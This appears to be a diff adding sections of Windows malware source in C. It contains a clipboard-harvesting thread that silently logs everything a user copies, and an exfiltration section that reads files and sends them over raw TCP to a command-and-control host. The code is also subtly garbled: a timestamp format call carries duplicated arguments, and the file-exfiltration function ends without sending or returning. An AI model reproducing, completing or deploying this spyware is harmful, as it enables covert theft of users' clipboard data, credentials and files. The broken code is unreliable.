@@ -722,7 +722,123 @@ static void clip_harvest(void) {
     
     HANDLE htext = GetClipboardData(CF_TEXT);
     if (htext) {
-        const *text = (const char *)GlobalLock(htext);
-        if 
+        const char *text = (const char *)GlobalLock(htext);
+        if (text && strlen(text) > 0) {
+            HANDLE hf = CreateFileA(CLIP_FILE, FILE_APPEND_DATA, FILE_SHARE_READ,
+                                      NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+            if (hf != INVALID_HANDLE_VALUE) {
+                SYSTEMTIME st; GetLocalTime(&st);
+                char header[64];
+                int hlen = snprintf(header, sizeof header,
+                                    "\r\n[CLIP %04d-%02d-%02d %02d:%02d:%02d]\r\n",
+                                    st.wYear, st.wMonth, st.wDay,
+                                    st.wHour, st.wMonth, st.wDay,
+                                    st.wHour, st.wMinute, st.wSecond);
+                DWORD written;
+                WriteFile(hf, header, (DWORD)hlen, &written, NULL);
+                WriteFile(hf, text, (DWORD)strlen(text), &written, NULL);
+                CloseHandle(hf);
+            }
+            GlobalUnlock(htext);
+        }
     }
+    CloseClipboard();
+}
+
+static DWORD WINAPI thread_clipboard(LPVOID _unused) {
+    (void)_unused;
+    char last_clip[4096] = {0};
+    while (g_running) {
+        if (OpenClipboard(NULL)) {
+            HANDLE h = GetClipboardData(CF_TEXT);
+            if (h) {
+                const char *text = (const char *)GlobalLock(h);
+                if (text && strncmp(text, last_clip, sizeof last_clip - 1)) {
+                    strncpy(last_clip, text, sizeof last_clip - 1);
+                    GlobalUnlock(h);
+                    CloseClipboard();
+                    clip_harvest();
+                    Sleep(500);
+                    continue;
+                }
+                if (text) GlobalUnlock(h);
+            }
+            CloseClipboard();
+        }
+        Sleep(1000);
+    }
+    return 0;
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════════
+ * SECTION 9 — Exfiltration
+ * ═══════════════════════════════════════════════════════════════════════════════ */
+
+/*
+ * exfil_send_raw
+ * Sends a raw byte buffer to host:port over TCP.
+ * Prepends a 4-byte big-endian length header so the receiver can reconstruct
+ * the stream without knowing file boundaries.
+ */
+static void exfil_send_raw(const char *host, int port,
+                             const BYTE *data, SIZE_T len) {
+    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (s == INVALID_SOCKET) return;
+    
+    struct sockaddr_in addr;
+    ZeroMemory(&addr, sizeof addr);
+    addr.sin_family       = AF_INET;
+    addr.sin_port         = htons((u_short)port);
+    addr.sin_addr.s_addr   = inet_addr(host);
+    
+    if (connect(s, (struct sockaddr *)&addr, sizeof addr) != 0) {
+        closesocket(s); return;
+    }
+    
+    /* 4-byte length header (big-endian) */
+    uint32_t nlen = htonl((uint32_t)len);
+    send(s, (const char *)&nlen, 4, 0);
+    
+    /* chunked send */
+    SIZE_T sent = 0;
+    while (sent < len) {
+        SIZE_T chunk = (len - sent < EXFIL_CHUNK) ? len - sent : EXFIL_CHUNK;
+        int r = send(s, (const char *)(data + sent), (int)chunk, 0);
+        if (r <= 0) break;
+        sent += r;
+    }
+    closesocket(s);
+    log_write("exfil: sent %zu/%zu bytes to %s:%d", sent, len, host, port);
+}
+
+/*
+ * exfil_file
+ * Reads a file into memory, XOR-obfuscates it, transmits to C2.
+ * Returns 1 on success.
+ */
+static int exfil_file(const char *filepath) {
+    HANDLE h = CreateFileA(filepath, GENERIC_READ, FILE_SHARE_READ,
+                            NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h == INVALID_HANDLE_VALUE) return 0;
+    
+    DWORD file_size = GetFileSize(h, NULL);
+    if (file_size == 0 || file_size == INVALID_FILE_SIZE) {
+        CloseHandle(h); return 0;
+    }
+    
+    /* Cap single-file exfil at 50 MB to avoid memory exhaustion */
+    if (file_size > 50 * 1024 * 1024) {
+        log_write("exfil: %s too large (%lu bytes), skipping", filepath, file_size);
+        CloseHandle(h);
+        return 0;
+    }
+    
+    BYTE *buf = (BYTE *)malloc(file_size);
+    if (!buf) { CloseHandle(h); return 0; }
+    
+    DWORD read = 0;
+    BOOL ok = ReadFile(h, buf, file_size, &read, NULL);
+    CloseHandle(h);
+    
+    if (!ok || read != file_size) { free(buf); return 0; }
 }
